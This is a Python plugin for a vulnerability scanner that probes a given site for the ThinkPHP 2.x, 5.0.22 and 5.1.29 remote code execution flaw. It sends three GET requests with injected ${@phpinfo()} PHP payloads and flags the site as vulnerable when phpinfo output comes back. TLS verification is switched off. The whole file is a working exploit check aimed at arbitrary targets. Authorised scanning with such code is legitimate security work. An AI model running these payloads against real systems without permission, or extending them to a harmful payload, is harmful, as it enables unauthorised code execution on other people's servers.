#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ''
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "ThinkPHP-2x or 5.0.22/5.1.29 RCE "
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['auhor'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  targets = ["/index.php/module/aciton/param1/${@phpinfo()}","/index.php?s=/index/index/xxx/${@phpinfo()}","/index.php?s=/index/index/name/$%7B@phpinfo()%7D"]
  url1 = url + targets[0]
  url2 = url + targets[1]
  url3 = url + targets[2]
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "phpinfo()" in res.text and 'PHP Version' in res.text:
      ret['url'] = url1
      ret['ifbug'] = True
      res.close()
      return ret
    res2=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res2.status_code == 200 and "phpinfo()" in res2.text and 'PHP Version' in res2.text:
      res2.close()
      ret['ifbug'] = True
      ret['url'] = url2
      return ret
    res3=requests.get(url=url3,headers=headers,timeout=5,verify=False)
    if res3.status_code == 200 and "phpinfo()" in res3.text and 'PHP Version' in res3.text:
      ret['url'] = url3
      ret['ifbug'] = True
      res3.close()
      return ret
    else:
      return ret
  except:
    return ret 